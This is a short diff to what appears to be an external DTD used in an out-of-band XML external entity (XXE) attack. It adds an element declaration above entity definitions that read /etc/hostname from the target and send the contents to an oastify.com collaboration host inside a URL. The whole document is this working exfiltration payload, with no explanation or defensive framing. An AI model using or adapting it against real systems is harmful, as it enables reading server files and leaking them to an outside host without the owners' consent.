@@ -1,3 +1,4 @@
+<!ELEMENT foo ANY>
 <!ENTITY % p1 SYSTEM "file:///etc/hostname">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://zuxjktzyfkdi92zkh58fhou38uel2bq0.oastify.com/?%p1;'>">
 %p2;
